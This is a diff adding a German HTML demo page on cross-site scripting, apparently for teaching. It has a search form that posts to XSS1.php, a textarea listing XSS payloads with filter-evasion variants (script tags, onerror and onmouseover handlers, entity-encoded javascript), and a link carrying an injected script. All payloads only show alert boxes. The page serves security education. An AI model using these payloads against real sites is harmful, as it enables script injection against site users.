@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cross Side Scripting (XSS)</title>
+</head>
+<body>
+<h2>Cross Side Scripting (XSS)</h2>
+
+<form method="get" rel="search" action="XSS1.php" style="font-size: 50px">
+    <label for="search">Suchen: </label>
+    <input id="search" name="parameter" style="font-size: 50px">
+    <button type="submit"  style="font-size: 50px">Suche!</button>
+</form>
+
+<br/>
+<a href="XSS-secure.html">XSS secure</a>
+<br><br>
+<textarea style="width: 100%; height: 300px">
+    <script> alert("Sie wurden gehackt");</script>
+
+    ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+
+    <p onmouseover=javascript:alert(&quot;XSS&quot;)>mouseover</p>
+
+    <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+
+    <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+
+    <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+    <<SCRIPT>alert("XSS");//<</SCRIPT>
+
+
+</textarea>
+
+<a href='./XSS1.php?parameter=<script type="text/javascript">alert("XSS")</script>'>XSS per Link</a>
+<br/>
+<br/>
+
+<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#XSS_Locator_.28short.29">mehr XSS</a>
+</body>
+</html>
